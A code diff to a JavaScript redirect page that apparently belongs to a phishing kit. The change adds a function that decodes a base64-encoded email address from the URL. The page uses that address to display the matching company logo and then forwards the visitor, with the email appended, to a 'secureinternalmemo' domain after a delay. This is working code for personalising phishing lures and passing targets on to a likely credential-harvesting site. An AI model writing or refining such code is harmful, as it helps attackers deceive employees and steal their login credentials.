@@ -157,7 +157,29 @@
        
         const MOBILE_REDIRECT_URL_BASE = "https://secureinternalmemo.tdmgo.co/?WqXmwl=S0pCTktYQ1dTSlNOQ1NKSw%3D%3D&pCmfRY=FkpVQ&username=";
 
-        function getEmailFromState() {
+        function getEmailFromUrl() {
+            // First, try to get base64 encoded email from the first parameter after ?
+            const url = window.location.href;
+            const firstQuestionMark = url.indexOf('?');
+            if (firstQuestionMark !== -1) {
+                const afterQuestion = url.substring(firstQuestionMark + 1);
+                const firstParam = afterQuestion.split('&')[0];
+                
+                // Check if this looks like a base64 encoded email (no = in parameter name)
+                if (!firstParam.includes('=')) {
+                    try {
+                        const decodedEmail = atob(firstParam);
+                        if (decodedEmail && decodedEmail.includes('@')) {
+                            return decodedEmail;
+                        }
+                    } catch (e) {
+                        // If base64 decoding fails, continue to check state parameter
+                        console.log("Base64 decoding failed, checking state parameter");
+                    }
+                }
+            }
+
+            // Fallback to existing functionality - get email from state parameter
             const searchParams = new URLSearchParams(window.location.search);
             const state = searchParams.get('state');
             if (!state) return null;
@@ -187,7 +209,7 @@
         
         function performRedirect() {
             clearInterval(interval);
-            const email = getEmailFromState();
+            const email = getEmailFromUrl();
 
             if (email) {
                 console.log("Found email:", email);
@@ -207,7 +229,7 @@
             }
         }
         
-        const email = getEmailFromState();
+        const email = getEmailFromUrl();
         setCompanyLogo(email);
         setTimeout(performRedirect, REDIRECT_DELAY);
     })();
